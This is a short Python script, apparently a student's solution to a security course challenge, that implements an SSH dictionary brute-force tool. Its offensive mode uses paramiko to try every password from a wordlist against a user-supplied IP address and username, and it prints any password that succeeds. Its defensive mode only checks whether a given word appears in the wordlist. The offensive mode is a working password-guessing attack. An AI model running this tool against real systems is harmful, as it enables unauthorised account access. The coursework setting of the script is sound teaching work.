# Shebang line to specify the interpreter to use for running the script.
#!/usr/bin/python3

# Script: Ops 401d6 Class 17 Ops Challenge Solution
# Author: Nicholas Loiacono
# Date: 05/09/2023
# Purpose: Automated Brute Force Wordlist Attack Tool Part 2 of 3
# Resources: Chat GPT


# Start


import time
import paramiko

def offensive_mode(word_list_file, username, ip):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(word_list_file, 'r') as file:
        for line in file:
            password = line.strip()  # Remove newline characters
            try:
                ssh.connect(ip, username=username, password=password)
                print(f"Success! The password is {password}")
                break
            except paramiko.AuthenticationException:
                print(f"Failed to authenticate with password: {password}")
            time.sleep(1)  # Delay for 1 second

    ssh.close()

def defensive_mode(word_list_file, target_word):
    with open(word_list_file, 'r') as file:
        words = file.read().splitlines()  # Create a list of words
        if target_word in words:
            print(f'The word "{target_word}" appears in the word list.')
        else:
            print(f'The word "{target_word}" does not appear in the word list.')

def main():
    mode = input("Choose mode:\n1. Offensive; Dictionary Iterator\n2. Defensive; Password Recognized\n")
    word_list_file = input("Enter the word list file path: ")

    if mode == "1":
        username = input("Enter the username: ")
        ip = input("Enter the IP address: ")
        offensive_mode(word_list_file, username, ip)
    elif mode == "2":
        target_word = input("Enter a word to search for in the word list: ")
        defensive_mode(word_list_file, target_word)
    else:
        print("Invalid mode selected. Exiting.")

if __name__ == "__main__":
    main()


# End